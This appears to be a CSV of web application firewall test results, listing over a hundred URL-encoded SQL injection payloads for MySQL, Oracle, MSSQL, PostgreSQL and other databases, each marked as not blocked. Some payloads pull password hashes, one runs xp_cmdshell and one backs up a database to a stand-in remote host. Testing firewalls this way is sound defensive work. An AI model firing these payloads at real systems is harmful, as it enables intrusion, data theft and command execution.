test_name,url,method,status_code,is_blocked,bypassed
sqli,/?p=%27%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20--,GET,429,false,true
sqli,/?p=%27%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20/%2A,GET,429,false,true
sqli,/?p=%20AS%20INJECTX%20WHERE%201%3D1%20AND%201%3D1,GET,429,false,true
sqli,/?p=%27%29%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20--,GET,429,false,true
sqli,/?p=%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20--,GET,429,false,true
sqli,/?p=%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20--,GET,429,false,true
sqli,/?p=%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20/%2A,GET,429,false,true
sqli,/?p=%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20/%2A,GET,429,false,true
sqli,/?p=%27%29%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20/%2A,GET,429,false,true
sqli,/?p=%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20/%2A,GET,429,false,true
sqli,/?p=%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20--,GET,429,false,true
sqli,/?p=%29%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20--,GET,429,false,true
sqli,/?p=%29%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20/%2A,GET,429,false,true
sqli,/?p=%27%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20%23,GET,429,false,true
sqli,/?p=%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20%23,GET,429,false,true
sqli,/?p=%20AND%201%3D0,GET,429,false,true
sqli,/?p=%27%29%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20%23,GET,429,false,true
sqli,/?p=%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20%23,GET,429,false,true
sqli,/?p=%29%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20%23,GET,429,false,true
sqli,/?p=%20AND%201083%3D1083%20AND%20%281427%3D1427,GET,429,false,true
sqli,/?p=%20AND%201%3D0%23,GET,429,false,true
sqli,/?p=%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20%23,GET,429,false,true
sqli,/?p=%20AND%201%3D0--%20,GET,429,false,true
sqli,/?p=%20AND%201%3D1%20AND%20%27%%27%3D%27,GET,429,false,true
sqli,/?p=%20AND%201%3D1,GET,429,false,true
sqli,/?p=%27%20and%201%3Dcast%28%28SELECT%20column_name%20FROM%20information_schema.columns%20WHERE%20table_name%3D%27data_table%27%20LIMIT%201%20OFFSET%20data_offset%29%20as%20int%29%20and%20%271%27%3D%271,GET,429,false,true
sqli,/?p=%20AND%201%3D0%20AND%20%27%%27%3D%27,GET,429,false,true
sqli,/?p=%27%20and%201%3Dcast%28%28SELECT%20concat%28%27DATABASE%3A%20%27%2Ccurrent_database%28%29%29%29%20as%20int%29%20and%20%271%27%3D%271,GET,429,false,true
sqli,/?p=%27%20and%201%3D%28%20if%28%28load_file%28char%28110%2C46%2C101%2C120%2C116%29%29%3C%3Echar%2839%2C39%29%29%2C1%2C0%29%29%3B,GET,429,false,true
sqli,/?p=%27%20and%201%3Dcast%28%28SELECT%20table_name%20FROM%20information_schema.tables%20LIMIT%201%20OFFSET%20data_offset%29%20as%20int%29%20and%20%271%27%3D%271,GET,429,false,true
sqli,/?p=%20AND%201%3D1%23,GET,429,false,true
sqli,/?p=%20AND%201%3D1--%20,GET,429,false,true
sqli,/?p=%27%20and%201%3Dcast%28%28SELECT%20data_column%20FROM%20data_table%20LIMIT%201%20OFFSET%20data_offset%29%20as%20int%29%20and%20%271%27%3D%271,GET,429,false,true
sqli,/?p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20COUNT%28DISTINCT%28USERNAME%29%29%20FROM%20SYS.ALL_USERS%29%29%20AND%20%27i%27%3D%27i,GET,429,false,true
sqli,/?p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20COUNT%28DISTINCT%28GRANTED_ROLE%29%29%20FROM%20DBA_ROLE_PRIVS%20WHERE%20GRANTEE%3DSYS.LOGIN_USER%29%29%20AND%20%27i%27%3D%27i,GET,429,false,true
sqli,/?p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20DISTINCT%28column_name%29%20FROM%20%28SELECT%20DISTINCT%28column_name%29%2C%20ROWNUM%20AS%20LIMIT%20FROM%20all_tab_columns%29%20WHERE%20LIMIT%3D3%29%29%20AND%20%27i%27%3D%27i,GET,429,false,true
sqli,/?p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20DISTINCT%28granted_role%29%20FROM%20%28SELECT%20DISTINCT%28granted_role%29%2C%20ROWNUM%20AS%20LIMIT%20FROM%20dba_role_privs%20WHERE%20GRANTEE%3DSYS.LOGINUSER%29%20WHERE%20LIMIT%3D3%29%29%20AND%20%27i%27%3D%27i,GET,429,false,true
sqli,/?p=%27%20and%201%20in%20%28select%20min%28name%29%20from%20sysobjects%20where%20xtype%20%3D%20%27U%27%20and%20name%20%3E%20%27.%27%29%20--,GET,429,false,true
sqli,/?p=%27%20and%201%20in%20%28select%20var%20from%20temp%29--,GET,429,false,true
sqli,/?p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20COUNT%28DISTINCT%28PASSWORD%29%29%20FROM%20SYS.USER%24%29%29%20AND%20%27i%27%3D%27i,GET,429,false,true
sqli,/?p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20banner%20FROM%20v%24version%20WHERE%20ROWNUM%3D1%29%29%20AND%20%27i%27%3D%27i,GET,429,false,true
sqli,/?p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20COUNT%28DISTINCT%28table_name%29%29%20FROM%20sys.all_tables%29%29%20AND%20%27i%27%3D%27i,GET,429,false,true
sqli,/?p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20COUNT%28DISTINCT%28column_name%29%29%20FROM%20sys.all_tab_columns%29%29%20AND%20%27i%27%3D%27i,GET,429,false,true
sqli,/?p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20global_name%20FROM%20global_name%29%29%20AND%20%27i%27%3D%27i,GET,429,false,true
sqli,/?p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20SYS.DATABASE_NAME%20FROM%20DUAL%29%29%20AND%20%27i%27%3D%27i,GET,429,false,true
sqli,/?p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20DISTINCT%28table_name%29%20FROM%20%28SELECT%20DISTINCT%28table_name%29%2C%20ROWNUM%20AS%20LIMIT%20FROM%20sys.all_tables%29%20WHERE%20LIMIT%3D6%29%29%20AND%20%27i%27%3D%27i,GET,429,false,true
sqli,/?p=AND%202947%3DLIKE%28%27ABCDEFG%27%2CUPPER%28HEX%28RANDOMBLOB%28500000000/2%29%29%29%29,GET,429,false,true
sqli,/?p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20DISTINCT%28PASSWORD%29%20FROM%20%28SELECT%20DISTINCT%28PASSWORD%29%2C%20ROWNUM%20AS%20LIMIT%20FROM%20SYS.USER%24%29%20WHERE%20LIMIT%3D3%29%29%20AND%20%27i%27%3D%27i,GET,429,false,true
sqli,/?p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20SYS.LOGIN_USER%20FROM%20DUAL%29%29%20AND%20%27i%27%3D%27i,GET,429,false,true
sqli,/?p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20host_name%20FROM%20v%24instance%29%29%20AND%20%27i%27%3D%27i,GET,429,false,true
sqli,/?p=%20AND%203516%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283516%3D3516%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29,GET,429,false,true
sqli,/?p=AND%202947%3DLIKE%28%27ABCDEFG%27%2CUPPER%28HEX%28RANDOMBLOB%281000000000/2%29%29%29%29,GET,429,false,true
sqli,/?p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20DISTINCT%28USERNAME%29%20FROM%20%28SELECT%20DISTINCT%28USERNAME%29%2C%20ROWNUM%20AS%20LIMIT%20FROM%20SYS.ALL_USERS%29%20WHERE%20LIMIT%3D5%29%29%20AND%20%27i%27%3D%27i,GET,429,false,true
sqli,/?p=%20AND%205650%3DCONVERT%28INT%2C%28UNION%20ALL%20SELECTCHAR%2888%29%29%29--%20,GET,429,false,true
sqli,/?p=%%27%20AND%208310%3D8311%20AND%20%27%%27%3D%27,GET,429,false,true
sqli,/?p=%20AND%205650%3DCONVERT%28INT%2C%28UNION%20ALL%20SELECTCHAR%2888%29%29%29,GET,429,false,true
sqli,/?p=%20AND%205650%3DCONVERT%28INT%2C%28UNION%20ALL%20SELECTCHAR%2888%29%2BCHAR%2888%29%29%29--%20,GET,429,false,true
sqli,/?p=%20AND%205650%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%285650%3D5650%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29,GET,429,false,true
sqli,/?p=%20AS%20INJECTX%20WHERE%201%3D1%20AND%201%3D1%23,GET,429,false,true
sqli,/?p=%20AND%205650%3DCONVERT%28INT%2C%28UNION%20ALL%20SELECTCHAR%2888%29%2BCHAR%2888%29%29%29%23,GET,429,false,true
sqli,/?p=AND%20MAKE_SET%28YOLO%3Cascii%28substring%28version%28%29%2CPOS%2C1%29%29%2C1%29,GET,429,false,true
sqli,/?p=AND%20MAKE_SET%28YOLO%3Cascii%28substring%28concat%28login%2Cpassword%29%2CPOS%2C1%29%29%2C1%29,GET,429,false,true
sqli,/?p=%20AND%205650%3DCONVERT%28INT%2C%28UNION%20ALL%20SELECTCHAR%2888%29%29%29%23,GET,429,false,true
sqli,/?p=AND%20%5BRANDNUM%5D%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C%5BSLEEPTIME%5D000000%29%29,GET,429,false,true
sqli,/?p=AND%20MAKE_SET%28YOLO%3C%28SELECT%28length%28concat%28login%2Cpassword%29%29%29%29%2C1%29,GET,429,false,true
sqli,/?p=AND%20MAKE_SET%28YOLO%3C%28SELECT%28length%28version%28%29%29%29%29%2C1%29,GET,429,false,true
sqli,/?p=%20AND%20%5BRANDNUM%5D%3DDBMS_PIPE.RECEIVE_MESSAGE%28%27%5BRANDSTR%5D%27%2C%5BSLEEPTIME%5D%29,GET,429,false,true
sqli,/?p=%27%20AND%20MID%28VERSION%28%29%2C1%2C1%29%20%3D%20%275%27%3B,GET,429,false,true
sqli,/?p=%20AND%20%5BRANDNUM%5D%3DLIKE%28%27ABCDEFG%27%2CUPPER%28HEX%28RANDOMBLOB%28%5BSLEEPTIME%5D00000000/2%29%29%29%29,GET,429,false,true
sqli,/?p=AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29bAKL%29%20AND%20%27vRxe%27%3D%27vRxe,GET,429,false,true
sqli,/?p=AND%20%5BRANDNUM%5D%3D%28SELECT%20%5BRANDNUM%5D%20FROM%20PG_SLEEP%28%5BSLEEPTIME%5D%29%29,GET,429,false,true
sqli,/?p=%27%20and%20%28SELECT%20count%28%2A%29%20from%20sysibm.columns%20t1%2C%20sysibm.columns%20t2%2C%20sysibm.columns%20t3%29%3E0%20and%20%28select%20ascii%28substr%28user%2C1%2C1%29%29%20from%20sysibm.sysdummy1%29%3D68%20,GET,429,false,true
sqli,/?p=%20AND%20%28SELECT%204523%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716a7a6a71%2C%28SELECT%20%28ELT%284523%3D4523%2C1%29%29%29%2C0x71706a6b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29,GET,429,false,true
sqli,/?p=AnD%20SLEEP%285%29%23,GET,429,false,true
sqli,/?p=and%20%28SELECT%20hex%28substr%28tbl_name%2C1%2C1%29%29%20FROM%20sqlite_master%20WHERE%20type%3D%27table%27%20and%20tbl_name%20NOT%20like%20%27sqlite_%%27%20limit%201%20offset%200%29%20%3E%20hex%28%27some_char%27%29,GET,429,false,true
sqli,/?p=AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29YjoC%29%20AND%20%27%%27%3D%27,GET,429,false,true
sqli,/?p=AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29nQIP%29--,GET,429,false,true
sqli,/?p=AnD%20SLEEP%285%29--,GET,429,false,true
sqli,/?p=AnD%20SLEEP%285%29,GET,429,false,true
sqli,/?p=AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29nQIP%29%23,GET,429,false,true
sqli,/?p=AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29nQIP%29,GET,429,false,true
sqli,/?p=%20and%20%28select%20substring%28%40%40version%2C3%2C1%29%29%3D%27S%27,GET,429,false,true
sqli,/?p=%27%20AnD%20SLEEP%285%29%20ANd%20%271,GET,429,false,true
sqli,/?p=AND%20updatexml%28rand%28%29%2Cconcat%28CHAR%28126%29%2Cversion%28%29%2CCHAR%28126%29%29%2Cnull%29-,GET,429,false,true
sqli,/?p=AND%20updatexml%28rand%28%29%2Cconcat%280x3a%2C%28SELECT%20concat%28CHAR%28126%29%2Ccolumn_name%2CCHAR%28126%29%29%20FROM%20information_schema.columns%20WHERE%20TABLE_NAME%3Ddata_table%20LIMIT%20data_offset%2C1%29%29%2Cnull%29--,GET,429,false,true
sqli,/?p=%27%20and%20updatexml%28null%2Cconcat%280x0a%2Cversion%28%29%29%2Cnull%29--%20-,GET,429,false,true
sqli,/?p=%27%20and%20substr%28version%28%29%2C1%2C10%29%20%3D%20%27PostgreSQL%27%20and%20%271,GET,429,false,true
sqli,/?p=%27%20and%20updatexml%28null%2Cconcat%280x0a%2C%28select%20table_name%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29%20LIMIT%200%2C1%29%29%2Cnull%29--%20-,GET,429,false,true
sqli,/?p=AND%20updatexml%28rand%28%29%2Cconcat%280x3a%2C%28SELECT%20concat%28CHAR%28126%29%2Cschema_name%2CCHAR%28126%29%29%20FROM%20information_schema.schemata%20LIMIT%20data_offset%2C1%29%29%2Cnull%29--,GET,429,false,true
sqli,/?p=AND%20updatexml%28rand%28%29%2Cconcat%280x3a%2C%28SELECT%20concat%28CHAR%28126%29%2CTABLE_NAME%2CCHAR%28126%29%29%20FROM%20information_schema.TABLES%20WHERE%20table_schema%3Ddata_column%20LIMIT%20data_offset%2C1%29%29%2Cnull%29--,GET,429,false,true
sqli,/?p=AND%20updatexml%28rand%28%29%2Cconcat%280x3a%2C%28SELECT%20concat%28CHAR%28126%29%2Cdata_info%2CCHAR%28126%29%29%20FROM%20data_table.data_column%20LIMIT%20data_offset%2C1%29%29%2Cnull%29--,GET,429,false,true
sqli,/?p=%20AS%20INJECTX%20WHERE%201%3D1%20AND%201%3D0,GET,429,false,true
sqli,/?p=%27%20and%20substr%28version%28%29%2C1%2C10%29%20%3D%20%27PostgreXXX%27%20and%20%271,GET,429,false,true
sqli,/?p=%2Bbenchmark%283200%2CSHA1%281%29%29%2B%27,GET,429,false,true
sqli,/?p=%20AS%20INJECTX%20WHERE%201%3D1%20AND%201%3D1--,GET,429,false,true
sqli,/?p=%20AS%20INJECTX%20WHERE%201%3D1%20AND%201%3D0--,GET,429,false,true
sqli,/?p=%2CcAsT%28chr%28126%29%7C%7C%28sEleCt%2Bcolumn_name%2BfRoM%2Binformation_schema.columns%2BwHerE%2Btable_name%3D%27data_table%27%2BlImIt%2B1%2Boffset%2Bdata_offset%29%7C%7Cchr%28126%29%2Bas%2BnUmeRiC%29--,GET,429,false,true
sqli,/?p=benchmark%2850000000%2CMD5%281%29%29--,GET,429,false,true
sqli,/?p=benchmark%2850000000%2CMD5%281%29%29,GET,429,false,true
sqli,/?p=benchmark%2810000000%2CMD5%281%29%29%23,GET,429,false,true
sqli,/?p=benchmark%2850000000%2CMD5%281%29%29%23,GET,429,false,true
sqli,/?p=select%20current_setting%28%27password_encryption%27%29%3B,GET,429,false,true
sqli,/?p=BACKUP%20database%20master%20to%20disks%3D%27%5C%5Cfake.domain%5Cbackupdb.dat%27,GET,429,false,true
sqli,/?p=%2CcAsT%28chr%28126%29%7C%7C%28sEleCt%2Bdata_column%2BfRoM%2Bdata_table%2BlImIt%2B1%2Boffset%2Bdata_offset%29%7C%7Cchr%28126%29%2Bas%2BnUmeRiC%29,GET,429,false,true
sqli,/?p=%2CcAsT%28chr%28126%29%7C%7CvErSiOn%28%29%7C%7Cchr%28126%29%2BaS%2BnUmeRiC%29,GET,429,false,true
sqli,/?p=%2CcAsT%28chr%28126%29%7C%7C%28sEleCt%2Btable_name%2BfRoM%2Binformation_schema.tables%2BlImIt%2B1%2Boffset%2Bdata_offset%29%7C%7Cchr%28126%29%2Bas%2BnUmeRiC%29--,GET,429,false,true
sqli,/?p=exec%20master..xp_cmdshell%20%27ipconfig%2B/all%27%20%20%20%20,GET,429,false,true
